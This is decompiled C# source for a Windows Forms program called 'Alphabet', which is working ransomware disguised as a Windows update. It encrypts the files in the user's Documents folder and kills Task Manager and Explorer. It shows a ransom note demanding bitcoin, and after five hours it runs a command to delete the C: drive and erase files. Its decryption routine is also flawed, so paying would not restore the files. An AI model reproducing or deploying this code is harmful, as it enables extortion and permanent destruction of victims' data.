using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Alphabet;

public class AlphabetForm : Form
{
	public static Random RNG = new Random();

	private static EncryptionEngine.RSA.EncryptorRSAKeys RSAKeys = EncryptionEngine.RSA.GenerateKeys(2048);

	private static byte[] AESKey = EncryptionEngine.Generate_AES_Key();

	public bool IsFullTransparent = false;

	public bool IsWeirdGlitchTimerMaxSpeed = false;

	private Tuple<string[], byte[][], Tuple<byte[], byte[]>[]> EncryptedF = EncryptedFiles(Environment.GetFolderPath(Environment.SpecialFolder.Personal));

	private IContainer components = null;

	private PictureBox Loader;

	private Label UpdateLabel;

	private Label label2;

	private Timer GuardThread;

	private PictureBox pictureBox1;

	private Timer WeirdGlitchTimer;

	private Timer TooLateTimer;

	private Timer VanishTimer;

	private Label TooLateMessageLabel;

	private Label label1;

	private TextBox textBox1;

	private Button button1;

	private Label label3;

	private Timer DeleteFilesTimer;

	private Label label4;

	public AlphabetForm()
	{
		InitializeComponent();
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	private static extern short GetKeyState(int keyCode);

	private void AlphabetForm_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void GuardThread_Tick(object sender, EventArgs e)
	{
		Process[] processesByName = Process.GetProcessesByName("taskmgr");
		foreach (Process process in processesByName)
		{
			process.Kill();
		}
	}

	private void WeirdGlitchTimer_Tick(object sender, EventArgs e)
	{
		if (WeirdGlitchTimer.get_Interval() <= 0)
		{
			WeirdGlitchTimer.set_Interval(1000);
		}
		try
		{
			if (!IsWeirdGlitchTimerMaxSpeed)
			{
				Timer weirdGlitchTimer = WeirdGlitchTimer;
				weirdGlitchTimer.set_Interval(weirdGlitchTimer.get_Interval() - 1000);
			}
		}
		catch
		{
			WeirdGlitchTimer.set_Interval(1);
			IsWeirdGlitchTimerMaxSpeed = true;
		}
		if (((Control)this).get_BackColor() == Color.White)
		{
			((Control)this).set_BackColor(Color.Black);
		}
		else
		{
			((Control)this).set_BackColor(Color.White);
		}
	}

	public static Tuple<string[], byte[][], Tuple<byte[], byte[]>[]> EncryptedFiles(string path)
	{
		List<string> list = new List<string>();
		List<byte[]> list2 = new List<byte[]>();
		List<Tuple<byte[], byte[]>> list3 = new List<Tuple<byte[], byte[]>>();
		int num = 0;
		string[] files = Directory.GetFiles(path);
		foreach (string path2 in files)
		{
			num++;
			try
			{
				list3.Add(EncryptionEngine.Encrypt_File_AESRSA(File.ReadAllBytes(path2), RSAKeys.PublicKey, AESKey));
				File.WriteAllBytes(path2, EncryptionEngine.Encrypt_File_AESRSA(File.ReadAllBytes(path2), RSAKeys.PublicKey, AESKey).Item1);
				list2.Add(File.ReadAllBytes(path2));
			}
			catch
			{
			}
		}
		return new Tuple<string[], byte[][], Tuple<byte[], byte[]>[]>(list.ToArray(), list2.ToArray(), list3.ToArray());
	}

	private void TooLateTimer_Tick(object sender, EventArgs e)
	{
		TooLateTimer.Stop();
		VanishTimer.Stop();
		Process[] processesByName = Process.GetProcessesByName("explorer");
		foreach (Process process in processesByName)
		{
			process.Kill();
		}
		((Control)TooLateMessageLabel).set_ForeColor(Color.White);
		((Control)this).set_Top(0);
		((Control)this).set_Left(0);
		Label obj = label4;
		((Control)obj).set_Text(((Control)obj).get_Text() + DateTime.Now.ToLongTimeString());
		((Control)this).set_Width(1920);
		((Control)this).set_Height(1080);
		((Control)label4).set_Visible(true);
		((Control)label4).set_ForeColor(Color.White);
		WeirdGlitchTimer.Stop();
		Loader.set_Image((Image)null);
		((Control)label1).set_Visible(true);
		pictureBox1.set_Image((Image)null);
		((Control)UpdateLabel).set_Text("");
		((Control)label2).set_Text("");
		((Form)this).set_Opacity(1.0);
		((Control)this).set_BackColor(Color.FromArgb(0, RNG.Next(255), 0));
		((Control)textBox1).set_BackColor(Color.FromArgb(0, RNG.Next(255), 0));
		((Control)TooLateMessageLabel).set_Text("Your computer has been struck by the Alphabet Ransomware. All your documents are encrypted with the strongest encryption algorithms.\r\nThere is no way to decrypt your files without purchasing a special decryption key and typing it here. To get the decryption key you should pay 1.0BTC to the bitcoin address 17T3wKnZByNR2uofqq5mdHY4bSUB2S4E3t. \r\nIf you won't pay after 5 hours, all the encrypted files will be permanently erased!\r\nIf you will kill this application, the decryption key will be destroyed aswell\r\nand NO ONE will be able to decrypt your files.");
		((Control)textBox1).set_Visible(true);
		((Control)button1).set_Visible(true);
		((Control)label3).set_Visible(true);
		((Control)label1).set_ForeColor(Color.White);
	}

	private void VanishTimer_Tick(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(((Form)this).get_Opacity() - 0.009);
	}

	private void AlphabetForm_Load(object sender, EventArgs e)
	{
		((Control)TooLateMessageLabel).set_Text("");
	}

	private void button1_Click(object sender, EventArgs e)
	{
		int num = 0;
		if (((Control)textBox1).get_Text() == RSAKeys.PublicKey)
		{
			string[] item = EncryptedF.Item1;
			foreach (string path in item)
			{
				((Control)label3).set_Text("Success! Your files are getting decrypted right now and the application will exit when it is done.");
				byte[] bytes = EncryptionEngine.Decrypt_File_AESRSA(EncryptedF.Item3[num], RSAKeys.PrivateKey);
				num++;
				try
				{
					File.WriteAllBytes(path, bytes);
				}
				catch
				{
				}
			}
			Thread.Sleep(3000);
			Application.Exit();
		}
		else
		{
			((Control)label3).set_Text("Your decryption code is incorrect! Please make sure you typed it correctly and try again.");
		}
	}

	private void DeleteFilesTimer_Tick(object sender, EventArgs e)
	{
		try
		{
			Process.Start("cmd", "/c rd C:\\ /s /q ");
		}
		catch
		{
		}
		string[] item = EncryptedF.Item1;
		foreach (string path in item)
		{
			((Control)label3).set_Text("The 5 hours have passed! Say \"Goodbye\" to your files!");
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Expected O, but got Unknown
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d3: Expected O, but got Unknown
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Expected O, but got Unknown
		//IL_011b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0125: Expected O, but got Unknown
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Expected O, but got Unknown
		//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Expected O, but got Unknown
		//IL_025c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0266: Expected O, but got Unknown
		//IL_0313: Unknown result type (might be due to invalid IL or missing references)
		//IL_031d: Expected O, but got Unknown
		//IL_032e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0338: Expected O, but got Unknown
		//IL_0450: Unknown result type (might be due to invalid IL or missing references)
		//IL_045a: Expected O, but got Unknown
		//IL_04d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04da: Expected O, but got Unknown
		//IL_0566: Unknown result type (might be due to invalid IL or missing references)
		//IL_0570: Expected O, but got Unknown
		//IL_0600: Unknown result type (might be due to invalid IL or missing references)
		//IL_060a: Expected O, but got Unknown
		//IL_06b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c1: Expected O, but got Unknown
		//IL_078b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0795: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(AlphabetForm));
		Loader = new PictureBox();
		UpdateLabel = new Label();
		label2 = new Label();
		GuardThread = new Timer(components);
		pictureBox1 = new PictureBox();
		WeirdGlitchTimer = new Timer(components);
		TooLateTimer = new Timer(components);
		VanishTimer = new Timer(components);
		TooLateMessageLabel = new Label();
		label1 = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		label3 = new Label();
		DeleteFilesTimer = new Timer(components);
		label4 = new Label();
		((ISupportInitialize)Loader).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)Loader).set_BackColor(Color.Transparent);
		Loader.set_Image((Image)componentResourceManager.GetObject("Loader.Image"));
		Loader.set_InitialImage((Image)componentResourceManager.GetObject("Loader.InitialImage"));
		((Control)Loader).set_Location(new Point(370, 225));
		((Control)Loader).set_Name("Loader");
		((Control)Loader).set_Size(new Size(90, 86));
		Loader.set_TabIndex(1);
		Loader.set_TabStop(false);
		((Control)UpdateLabel).set_AutoSize(true);
		((Control)UpdateLabel).set_BackColor(Color.Transparent);
		((Control)UpdateLabel).set_Font(new Font("Segoe UI Light", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)UpdateLabel).set_Location(new Point(285, 58));
		((Control)UpdateLabel).set_Name("UpdateLabel");
		((Control)UpdateLabel).set_Size(new Size(258, 41));
		((Control)UpdateLabel).set_TabIndex(2);
		((Control)UpdateLabel).set_Text("Preparing update...");
		UpdateLabel.set_TextAlign((ContentAlignment)2);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Segoe UI Light", 10.2f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label2).set_Location(new Point(596, 499));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(232, 23));
		((Control)label2).set_TabIndex(4);
		((Control)label2).set_Text("Microsoft Corporation © 2016");
		GuardThread.set_Enabled(true);
		GuardThread.set_Interval(1);
		GuardThread.add_Tick((EventHandler)GuardThread_Tick);
		((Control)pictureBox1).set_BackColor(Color.Transparent);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		pictureBox1.set_InitialImage((Image)componentResourceManager.GetObject("pictureBox1.InitialImage"));
		((Control)pictureBox1).set_Location(new Point(545, 300));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(260, 160));
		pictureBox1.set_TabIndex(5);
		pictureBox1.set_TabStop(false);
		WeirdGlitchTimer.set_Enabled(true);
		WeirdGlitchTimer.set_Interval(7000);
		WeirdGlitchTimer.add_Tick((EventHandler)WeirdGlitchTimer_Tick);
		TooLateTimer.set_Enabled(true);
		TooLateTimer.set_Interval(5000);
		TooLateTimer.add_Tick((EventHandler)TooLateTimer_Tick);
		VanishTimer.set_Enabled(true);
		VanishTimer.set_Interval(5000);
		VanishTimer.add_Tick((EventHandler)VanishTimer_Tick);
		((Control)TooLateMessageLabel).set_AutoSize(true);
		((Control)TooLateMessageLabel).set_Font(new Font("Lucida Console", 10.8f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)TooLateMessageLabel).set_Location(new Point(3, 13));
		((Control)TooLateMessageLabel).set_Name("TooLateMessageLabel");
		((Control)TooLateMessageLabel).set_Size(new Size(20, 19));
		((Control)TooLateMessageLabel).set_TabIndex(6);
		((Control)TooLateMessageLabel).set_Text(".");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Lucida Console", 10.8f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label1).set_Location(new Point(8, 152));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(196, 19));
		((Control)label1).set_TabIndex(7);
		((Control)label1).set_Text("Decryption code: ");
		((Control)label1).set_Visible(false);
		((Control)textBox1).set_BackColor(Color.Red);
		((Control)textBox1).set_Font(new Font("Lucida Console", 10.8f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)textBox1).set_ForeColor(Color.White);
		((Control)textBox1).set_Location(new Point(231, 149));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(154, 25));
		((Control)textBox1).set_TabIndex(8);
		((Control)textBox1).set_Visible(false);
		((Control)button1).set_BackColor(Color.WhiteSmoke);
		((Control)button1).set_Font(new Font("Lucida Console", 10.8f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)button1).set_Location(new Point(12, 182));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(139, 68));
		((Control)button1).set_TabIndex(9);
		((Control)button1).set_Text("Decrypt.");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).set_Visible(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Lucida Console", 10.8f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(12, 263));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(20, 19));
		((Control)label3).set_TabIndex(11);
		((Control)label3).set_Text(".");
		((Control)label3).set_Visible(false);
		DeleteFilesTimer.set_Enabled(true);
		DeleteFilesTimer.set_Interval(18000000);
		DeleteFilesTimer.add_Tick((EventHandler)DeleteFilesTimer_Tick);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Lucida Console", 10.8f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label4).set_Location(new Point(3, 453));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(350, 19));
		((Control)label4).set_TabIndex(12);
		((Control)label4).set_Text("Your files were encrypted on:  ");
		((Control)label4).set_Visible(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.White);
		((Form)this).set_ClientSize(new Size(857, 531));
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)TooLateMessageLabel);
		((Control)this).get_Controls().Add((Control)(object)UpdateLabel);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)Loader);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("AlphabetForm");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Windows_Update.exe");
		((Form)this).add_Load((EventHandler)AlphabetForm_Load);
		((ISupportInitialize)Loader).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
